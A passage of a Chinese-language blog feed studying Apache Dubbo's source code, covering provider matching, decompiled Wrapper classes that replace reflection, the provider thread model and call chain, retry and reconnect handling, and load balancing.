isMatchCategory(providerUrl.getParameter(Constants.CATEGORY_KEY, Constants.DEFAULT_CATEGORY),             consumerUrl.getParameter(Constants.CATEGORY_KEY, Constants.DEFAULT_CATEGORY))) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-keyword">if</span> (! providerUrl.getParameter(Constants.ENABLED_KEY, <span class="hljs-keyword">true</span>)             &amp;&amp; ! Constants.ANY_VALUE.equals(consumerUrl.getParameter(Constants.ENABLED_KEY))) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;       String consumerGroup = consumerUrl.getParameter(Constants.GROUP_KEY);    String consumerVersion = consumerUrl.getParameter(Constants.VERSION_KEY);    String consumerClassifier = consumerUrl.getParameter(Constants.CLASSIFIER_KEY, Constants.ANY_VALUE);        String providerGroup = providerUrl.getParameter(Constants.GROUP_KEY);    String providerVersion = providerUrl.getParameter(Constants.VERSION_KEY);    String providerClassifier = providerUrl.getParameter(Constants.CLASSIFIER_KEY, Constants.ANY_VALUE);    <span class="hljs-keyword">return</span> (Constants.ANY_VALUE.equals(consumerGroup) || StringUtils.isEquals(consumerGroup, providerGroup) || StringUtils.isContains(consumerGroup, providerGroup))           &amp;&amp; (Constants.ANY_VALUE.equals(consumerVersion) || StringUtils.isEquals(consumerVersion, providerVersion))           &amp;&amp; (consumerClassifier == <span class="hljs-keyword">null</span> || Constants.ANY_VALUE.equals(consumerClassifier) || StringUtils.isEquals(consumerClassifier, providerClassifier));&#125;</code></pre><p>当然这是分析的单分组的，如果是多分组的即group=”idc001,idc003”这种还有一些其他逻辑处理。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]20.反射调用是如何优化的？Wrapper的作用是什么？</title>
    <link href="/2020/06/13/dubbo-20.how-improve-reflect/"/>
    <url>/2020/06/13/dubbo-20.how-improve-reflect/</url>
    
    <content type="html"><![CDATA[<h2 id="20-反射调用是如何优化的？Wrapper的作用是什么？"><a href="#20-反射调用是如何优化的？Wrapper的作用是什么？" class="headerlink" title="20.反射调用是如何优化的？Wrapper的作用是什么？"></a>20.反射调用是如何优化的？Wrapper的作用是什么？</h2><h3 id="反编译生成的代码"><a href="#反编译生成的代码" class="headerlink" title="反编译生成的代码"></a>反编译生成的代码</h3><p>对于动态代码生成的class可以写出到本地，办法是：  </p><p>在com.alibaba.dubbo.common.bytecode.<strong>ClassGenerator.mCtc</strong>这个实例有</p><p>javassist.CtClass.<strong>writeFile</strong>(String)方法，可以在com.alibaba.dubbo.common.bytecode.ClassGenerator.toClass()结束时将生成的class写出到本地。  </p><p>对于动态代码生成的class可以用<a href="https://bitbucket.org/mstrobel/procyon/src/default/" target="_blank" rel="noopener">procyon反编译器</a>反编译，命令行形式的，JD有点力不从心。  </p><p>也可以用阿尔特斯等诊断工具导出。  </p><pre><code class="hljs java"><span class="hljs-comment">// com.alibaba.dubbo.common.bytecode.ClassGenerator.mCtc</span><span class="hljs-comment">// mCtc.writeFile("d:/")</span><span class="hljs-comment">//D:\002.tools&gt;java -jar procyon-decompiler-0.5.36.jar //d:\com\alibaba\dubbo\common\bytecode\Wrapper0.class</span><span class="hljs-comment">//</span><span class="hljs-comment">// Decompiled by Procyon v0.5.36</span><span class="hljs-comment">//</span><span class="hljs-keyword">package</span> com.alibaba.dubbo.common.bytecode;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> org.simonme.dubbo.demo.provider.service.HelloService;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wrapper0</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Wrapper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassGenerator</span>$<span class="hljs-title">DC</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] pns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map pts;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] mns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] dmns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class[] mts0;    <span class="hljs-keyword">public</span> String[] getPropertyNames() &#123;        <span class="hljs-keyword">return</span> Wrapper0.pns;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasProperty</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span> </span>&#123;        <span class="hljs-keyword">return</span> Wrapper0.pts.containsKey(s);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">getPropertyType</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span> </span>&#123;        <span class="hljs-keyword">return</span> Wrapper0.pts.get(s);    &#125;    <span class="hljs-keyword">public</span> String[] getMethodNames() &#123;        <span class="hljs-keyword">return</span> Wrapper0.mns;    &#125;    <span class="hljs-keyword">public</span> String[] getDeclaredMethodNames() &#123;        <span class="hljs-keyword">return</span> Wrapper0.dmns;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPropertyValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s, <span class="hljs-keyword">final</span> Object o2)</span> </span>&#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">final</span> HelloService helloService = (HelloService)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchPropertyException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found property \""</span>).append(s).append(<span class="hljs-string">"\" filed or setter method in class org.simonme.dubbo.demo.provider.service.HelloService."</span>).toString());    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getPropertyValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s)</span> </span>&#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">final</span> HelloService helloService = (HelloService)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchPropertyException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found property \""</span>).append(s).append(<span class="hljs-string">"\" filed or setter method in class org.simonme.dubbo.demo.provider.service.HelloService."</span>).toString());    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invokeMethod</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s, <span class="hljs-keyword">final</span> Class[] array, <span class="hljs-keyword">final</span> Object[] array2)</span> <span class="hljs-keyword">throws</span> InvocationTargetException </span>&#123;        HelloService helloService;        <span class="hljs-keyword">try</span> &#123;            helloService = (HelloService)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-string">"sayHello"</span>.equals(s) &amp;&amp; array.length == <span class="hljs-number">1</span>) &#123;                helloService.sayHello((String)array2[<span class="hljs-number">0</span>]);                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;            &#125;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t2) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvocationTargetException(t2);        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchMethodException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found method \""</span>).append(s).append(<span class="hljs-string">"\" in class org.simonme.dubbo.demo.provider.service.HelloService."</span>).toString());    &#125;&#125;</code></pre><p>invokeMethod 实现了方法调用 </p><pre><code class="hljs java"><span class="hljs-comment">// D:\002.tools&gt;java -jar procyon-decompiler-0.5.36.jar // d:\com\alibaba\dubbo\common\bytecode\Wrapper1.class</span><span class="hljs-comment">//</span><span class="hljs-comment">// Decompiled by Procyon v0.5.36</span><span class="hljs-comment">//</span><span class="hljs-keyword">package</span> com.alibaba.dubbo.common.bytecode;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> org.simonme.dubbo.demo.provider.service.DepenededService;<span class="hljs-keyword">import</span> org.simonme.dubbo.demo.provider.service.impl.HelloServiceSlowImpl;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wrapper1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Wrapper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ClassGenerator</span>$<span class="hljs-title">DC</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] pns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map pts;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] mns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] dmns;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class[] mts0;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class[] mts1;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class[] mts2;    <span class="hljs-keyword">public</span> String[] getPropertyNames() &#123;        <span class="hljs-keyword">return</span> Wrapper1.pns;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasProperty</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span> </span>&#123;        <span class="hljs-keyword">return</span> Wrapper1.pts.containsKey(s);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">getPropertyType</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span> </span>&#123;        <span class="hljs-keyword">return</span> Wrapper1.pts.get(s);    &#125;    <span class="hljs-keyword">public</span> String[] getMethodNames() &#123;        <span class="hljs-keyword">return</span> Wrapper1.mns;    &#125;    <span class="hljs-keyword">public</span> String[] getDeclaredMethodNames() &#123;        <span class="hljs-keyword">return</span> Wrapper1.dmns;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPropertyValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s, <span class="hljs-keyword">final</span> Object o2)</span> </span>&#123;        HelloServiceSlowImpl helloServiceSlowImpl;        <span class="hljs-keyword">try</span> &#123;            helloServiceSlowImpl = (HelloServiceSlowImpl)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">if</span> (s.equals(<span class="hljs-string">"depenededService"</span>)) &#123;            helloServiceSlowImpl.setDepenededService((DepenededService)o2);            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchPropertyException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found property \""</span>).append(s).append(<span class="hljs-string">"\" filed or setter method in class org.simonme.dubbo.demo.provider.service.impl.HelloServiceSlowImpl."</span>).toString());    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getPropertyValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s)</span> </span>&#123;        HelloServiceSlowImpl helloServiceSlowImpl;        <span class="hljs-keyword">try</span> &#123;            helloServiceSlowImpl = (HelloServiceSlowImpl)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">if</span> (s.equals(<span class="hljs-string">"depenededService"</span>)) &#123;            <span class="hljs-keyword">return</span> helloServiceSlowImpl.getDepenededService();        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchPropertyException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found property \""</span>).append(s).append(<span class="hljs-string">"\" filed or setter method in class org.simonme.dubbo.demo.provider.service.impl.HelloServiceSlowImpl."</span>).toString());    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invokeMethod</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object o, <span class="hljs-keyword">final</span> String s, <span class="hljs-keyword">final</span> Class[] array, <span class="hljs-keyword">final</span> Object[] array2)</span> <span class="hljs-keyword">throws</span> InvocationTargetException </span>&#123;        HelloServiceSlowImpl helloServiceSlowImpl;        <span class="hljs-keyword">try</span> &#123;            helloServiceSlowImpl = (HelloServiceSlowImpl)o;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(t);        &#125;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">if</span> (<span class="hljs-string">"sayHello"</span>.equals(s) &amp;&amp; array.length == <span class="hljs-number">1</span>) &#123;                helloServiceSlowImpl.sayHello((String)array2[<span class="hljs-number">0</span>]);                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;            &#125;            <span class="hljs-keyword">if</span> (<span class="hljs-string">"getDepenededService"</span>.equals(s) &amp;&amp; array.length == <span class="hljs-number">0</span>) &#123;                <span class="hljs-keyword">return</span> helloServiceSlowImpl.getDepenededService();            &#125;            <span class="hljs-keyword">if</span> (<span class="hljs-string">"setDepenededService"</span>.equals(s) &amp;&amp; array.length == <span class="hljs-number">1</span>) &#123;                helloServiceSlowImpl.setDepenededService((DepenededService)array2[<span class="hljs-number">0</span>]);                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;            &#125;        &#125;        <span class="hljs-keyword">catch</span> (Throwable t2) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvocationTargetException(t2);        &#125;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchMethodException(<span class="hljs-keyword">new</span> StringBuffer().append(<span class="hljs-string">"Not found method \""</span>).append(s).append(<span class="hljs-string">"\" in class org.simonme.dubbo.demo.provider.service.impl.HelloServiceSlowImpl."</span>).toString());    &#125;&#125;</code></pre><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>wrap的作用 我的理解是将反射(读取字段、调用业务方法) 转成 直接调用，同时以统一的调用接口对外暴露</p><p>JavassistProxyFactory.getInvoker</p><p>先用Wrapper机制wrapper一下 。 对于生成的Wrapper实例再怎么放到调用链中和其他Invoker实例怎么相互对接并产生作用可以参见《调用链如何构建的？ProtocolFilterWrapper等分析》。</p><p>getPropertyValue与setPropertyValue在你的<strong>业务服务实现类中如果实例字段</strong>，比如依赖其他服务，这个生成的方法就会起作用了，可以参见上面反编译的第二段代码，<strong>上面贴了两段反编译的代码对比也是这个目的</strong>。</p><p>顺带说一句，JavassistProxyFactory 除了在其getInvoker对接wrapper机制完成上述事情之外，还<strong>通过其getProxy方法结合其父类的getProxy方法将EchoService回声服务自动织入</strong>进业务服务实现中。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]19.被consumer端调用时的线程模型与链路</title>
    <link href="/2020/06/13/dubbo-19.provider-thread-model-chain/"/>
    <url>/2020/06/13/dubbo-19.provider-thread-model-chain/</url>
    
    <content type="html"><![CDATA[<h2 id="19-被consumer端调用时的线程模型与链路"><a href="#19-被consumer端调用时的线程模型与链路" class="headerlink" title="19.被consumer端调用时的线程模型与链路"></a>19.被consumer端调用时的线程模型与链路</h2><p>provider侧  </p><h3 id="线程模型"><a href="#线程模型" class="headerlink" title="线程模型"></a>线程模型</h3><pre><code class="hljs plain">       +-----------------+         +-----------------+         +-----------------++------&gt;   boss&#x2F;         +--------&gt;+  worker&#x2F;        +---------&gt;  dubbo          |       |   accept        |         |  poller         |         |  serVer handler |       +-----------------+         +-----------------+         +-----------------+</code></pre><p>上图是默认情况，根据配置不同，可能会出现没有单独的dubbo server handler线程(池)，或者某些事件处理上没有。具体不同配置对应的细节可以参见《关于dubbo中业务线程池的处理也即对ChannelHandler与Dispatcher体现的分析》。</p><h3 id="链路"><a href="#链路" class="headerlink" title="链路"></a>链路</h3><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><p>Daemon Thread [DubboServerHandler-172.22.221.166:20880-thread-18] (Suspended (breakpoint at line 36 in HelloServiceSlowImpl))    </p><table><tr><td>CLASS_NAME</td><td>METHOD_NAME</td><td>LINE_NUM</td></tr><tr><td>org/simonme/dubbo/demo/provider/service/impl/HelloServiceSlowImpl</td><td>sayHello</td><td>40</td></tr><tr><td>com/alibaba/dubbo/common/bytecode/Wrapper1</td><td>invokeMethod</td><td>0</td></tr><tr><td>com/alibaba/dubbo/rpc/proxy/javassist/JavassistProxyFactory$1</td><td>doInvoke</td><td>46</td></tr><tr><td>com/alibaba/dubbo/rpc/proxy/AbstractProxyInvoker</td><td>invoke</td><td>76</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/InvokerWrapper</td><td>invoke</td><td>53</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/ExceptionFilter</td><td>invoke</td><td>121</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/monitor/support/MonitorFilter</td><td>invoke</td><td>75</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/TimeoutFilter</td><td>invoke</td><td>53</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/dubbo/filter/TraceFilter</td><td>invoke</td><td>125</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/ContextFilter</td><td>invoke</td><td>62</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/GenericFilter</td><td>invoke</td><td>112</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/ClassLoaderFilter</td><td>invoke</td><td>40</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/filter/EchoFilter</td><td>invoke</td><td>38</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/ProtocolFilterWrapper$1[Invoker]</td><td>invoke</td><td>91</td></tr><tr><td>com/alibaba/dubbo/rpc/protocol/dubbo/DubboProtocol$1[ExchangeHandlerAdapter]</td><td>reply</td><td>110</td></tr><tr><td>com/alibaba/dubbo/remoting/exchange/support/header/HeaderExchangeHandler</td><td>handleRequest</td><td>91</td></tr><tr><td>com/alibaba/dubbo/remoting/exchange/support/header/HeaderExchangeHandler</td><td>received</td><td>194</td></tr><tr><td>com/alibaba/dubbo/remoting/transport/DecodeHandler</td><td>received</td><td>53</td></tr><tr><td>com/alibaba/dubbo/remoting/transport/dispatcher/ChannelEventRunnable</td><td>run</td><td>99</td></tr></table><h4 id="框图简要示意"><a href="#框图简要示意" class="headerlink" title="框图简要示意"></a>框图简要示意</h4><pre><code class="hljs txt">+-------------------------+| DecodeHandler           ||   receiVed              |+------------+------------+             |             |             |+------------v------------+| HeaderExchangeHandler   ||   receiVed              |+------------+------------+             |             |             |+------------v------------+        ①| DubboProtocol$1.reply   |       get invoker then|   ExchangeHandlerAdapter|  &lt;---+call invoker.invoke(Invocation)+------------+------------+             |             |             |+------------v------------+       ②| ProtocolFilterWrapper$1 |       inVoke chain|   InVoker               |  &lt;---+invoker+filter&#x3D;chain+------------+------------+             |             |             |+------------v------------+       ③| JavassistProxyFactory$1 |       dynmaic generate code|   Wrapper               |  &lt;---+replace reflect+------------+------------+             |             |             |+------------v------------+       ④|  bizService             |  &lt;---business code|  dobiz                  |+-------------------------+</code></pre><p>大致解释一下：</p><ol><li>① 在解码过后，流转至DubbooProtocol中，此环节是用了一个ExchangeHandlerAdapter的匿名内部类，主要逻辑是：查找Invoker实例 并 触发invoke调用。查找Invoker实例是从对应的Exporter实例中找到，关于Exporter的export导出过程相关可以参见《提供者如何注册服务》。</li><li>② 步骤1 调用的invoker是ProtocolFilterWrapper内部的匿名内部类，此处是一个调用链，此invoker实例表示调用链的头部元素，看调用栈可以发现会挨个调用下去，且<strong>此些Invoker实例都是包在filter外面</strong>，本质是filter。调用链的构造过程参见《调用链如何构建的？ProtocolFilterWrapper分析》。构造过程还是有点意思的。</li><li>③JavassistProxyFactory用一个Wrapper的匿名内部类对接，用动态生成代码的手段替换掉对业务代码反射调用。具体细节可以参见《反射调用是如何优化的？Wrapper的作用是什么？》。</li><li>④走到真正的业务代码逻辑中。</li></ol>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]18.重试、provider下线、网络断开等容错怎么实现</title>
    <link href="/2020/06/13/dubbo-18.retry-offline/"/>
    <url>/2020/06/13/dubbo-18.retry-offline/</url>
    
    <content type="html"><![CDATA[<h2 id="18-重试、provider下线、网络断开等容错怎么实现"><a href="#18-重试、provider下线、网络断开等容错怎么实现" class="headerlink" title="18.重试、provider下线、网络断开等容错怎么实现"></a>18.重试、provider下线、网络断开等容错怎么实现</h2><h3 id="case构造的方式"><a href="#case构造的方式" class="headerlink" title="case构造的方式"></a>case构造的方式</h3><p>可以在DubboInvoker.doInvoke打断点，然后让provider下线，然后再继续执行刚才断点停住的地方等等构造异常场景。  </p><h3 id="如果有provider服务停掉，-consumer端如何感知？再次启动刚停掉的provider呢"><a href="#如果有provider服务停掉，-consumer端如何感知？再次启动刚停掉的provider呢" class="headerlink" title="如果有provider服务停掉， consumer端如何感知？再次启动刚停掉的provider呢"></a>如果有provider服务停掉， consumer端如何感知？再次启动刚停掉的provider呢</h3><p>provider停掉会触发zk客户端的监听，监听对客户端的invoker列表进行刷新。<br>再次启动会触发 zk的监听，代码在<code>ZkclientZookeeperClient</code></p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> IZkChildListener <span class="hljs-title">createTargetChildListener</span><span class="hljs-params">(String path, <span class="hljs-keyword">final</span> ChildListener listener)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> IZkChildListener() &#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleChildChange</span><span class="hljs-params">(String parentPath, List&lt;String&gt; currentChilds)</span></span><span class="hljs-function"><span class="hljs-keyword">throws</span> Exception </span>&#123;listener.childChanged(parentPath, currentChilds);&#125;&#125;;&#125;</code></pre><p>然后再触发 com.alibaba.dubbo.registry.support.FailbackRegistry.doNotify(URL, NotifyListener, List)。<br>com.alibaba.dubbo.registry.integration.RegistryDirectory.refreshInvoker(List)， 这是在zk的event线程完成的。<br>如果有provider停掉了 走一样的监听逻辑</p><p>同时，<strong>dubbo支持 定时检查provider的状态并进行重连</strong>，具体参见<br>com.alibaba.dubbo.remoting.transport.AbstractClient.initConnectStatusCheckCommand()<br>reconnectExecutorService.scheduleWithFixedDelay(connectStatusCheckCommand, reconnect, reconnect, TimeUnit.MILLISECONDS);  </p><h3 id="如果正在发服务的时候，provider停掉了，dubbo是如何处理的？"><a href="#如果正在发服务的时候，provider停掉了，dubbo是如何处理的？" class="headerlink" title="如果正在发服务的时候，provider停掉了，dubbo是如何处理的？"></a>如果正在发服务的时候，provider停掉了，dubbo是如何处理的？</h3><p>如果在发服务时，provider停掉了，那么此时会抛出异常，并在FailoverClusterInvoker doInvoke中捕获，<br><strong>FailoverClusterInvoker支持调用失败时重试(可配置)，此时达到再次重试的目的</strong>。</p><p>配置获取的代码：  </p><p>com.alibaba.dubbo.rpc.cluster.support.FailoverClusterInvoker.doInvoke(Invocation, List&lt;Invoker<T>&gt;, LoadBalance)</p><pre><code class="hljs java"><span class="hljs-keyword">int</span> len = getUrl().getMethodParameter(invocation.getMethodName(), Constants.RETRIES_KEY, Constants.DEFAULT_RETRIES) + <span class="hljs-number">1</span>;</code></pre><h3 id="client在多次调用时，与provider端的连接是建立几次，在prodvider端服务状态有变化时呢？"><a href="#client在多次调用时，与provider端的连接是建立几次，在prodvider端服务状态有变化时呢？" class="headerlink" title="client在多次调用时，与provider端的连接是建立几次，在prodvider端服务状态有变化时呢？"></a>client在多次调用时，与provider端的连接是建立几次，在prodvider端服务状态有变化时呢？</h3><p>NettyClient 的doOpen doConnect均在初始化的时候调用，有几个provider就调用几次，真正rpc调用服务的时候是不会再调用open与connect的。<br>上面这个说法不严格，因为看他发送消息的代码就知道了，每次发消息时还会检查下：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">(Object message, <span class="hljs-keyword">boolean</span> sent)</span> <span class="hljs-keyword">throws</span> RemotingException </span>&#123;    <span class="hljs-keyword">if</span> (send_reconnect &amp;&amp; !isConnected())&#123;        connect();    &#125;    Channel channel = getChannel();    <span class="hljs-comment">//TODO getChannel返回的状态是否包含null需要改进</span>    <span class="hljs-keyword">if</span> (channel == <span class="hljs-keyword">null</span> || ! channel.isConnected()) &#123;      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RemotingException(<span class="hljs-keyword">this</span>, <span class="hljs-string">"message can not send, because channel is closed . url:"</span> + getUrl());    &#125;    channel.send(message, sent);&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]17.负载均衡如何实现</title>
    <link href="/2020/06/13/dubbo-17.consumer-how-to-implement-load-blance/"/>
    <url>/2020/06/13/dubbo-17.consumer-how-to-implement-load-blance/</url>
    
    <content type="html"><![CDATA[<h2 id="17-负载均衡如何实现"><a href="#17-负载均衡如何实现" class="headerlink" title="17.负载均衡如何实现"></a>17.负载均衡如何实现</h2><h3 id="分析负载均衡的test-case"><a href="#分析负载均衡的test-case" class="headerlink" title="分析负载均衡的test case"></a>分析负载均衡的test case</h3><p>起两个provider，前面文章中有现成的provider，起来就好。  </p><p>用HelloClientTest testSayHello调用几次，观察落在哪个provider上。  </p><h3 id="分析负载均衡"><a href="#分析负载均衡" class="headerlink" title="分析负载均衡"></a>分析负载均衡</h3><p>对于客户端调用过程中的逻辑，比如上篇的路由，这一篇的负载均衡等等机制，都可以通过观察调用前的调用栈来分析发现。  </p><p>在 com.alibaba.dubbo.rpc.protocol.dubbo.DubboInvoker.doInvoke(Invocation)里面打个断点后观察他的调用栈或者用arthas观察他的调用栈，不难发现负载均衡是在 FailoverClusterInvoker<T>.doInvoke(Invocation, List&lt;Invoker<T>&gt;, LoadBalance) line: 77    中发起的：  </p><p>com.alibaba.dubbo.rpc.cluster.support.FailoverClusterInvoker.doInvoke(Invocation, List&lt;Invoker<T>&gt;, LoadBalance)    </p><pre><code class="hljs java"><span class="hljs-number">73</span>            Invoker&lt;T&gt; invoker = select(loadbalance, invocation, copyinvokers, invoked);<span class="hljs-number">74</span>            invoked.add(invoker);<span class="hljs-number">75</span>            RpcContext.getContext().setInvokers((List)invoked);<span class="hljs-number">76</span>            <span class="hljs-keyword">try</span> &#123;<span class="hljs-number">77</span>                Result result = invoker.invoke(invocation);</code></pre><p><strong>73行是负载均衡发起的地方，也是与client发起调用时交织的地方。</strong></p><p>看73行的com.alibaba.dubbo.rpc.cluster.support.AbstractClusterInvoker.select(LoadBalance, Invocation, List&lt;Invoker<T>&gt;, List&lt;Invoker<T>&gt;)方法签名，能发现将一个invoker list送进去选一个invoker出来。  </p><p>我们跟一下代码，不难发现，下面贴一下到具体的负载均衡的策略的调用栈：  </p><pre><code class="hljs java">RandomLoadBalance.doSelect(List&lt;Invoker&lt;T&gt;&gt;, URL, Invocation) line: <span class="hljs-number">38</span>RandomLoadBalance(AbstractLoadBalance).select(List&lt;Invoker&lt;T&gt;&gt;, URL, Invocation) line: <span 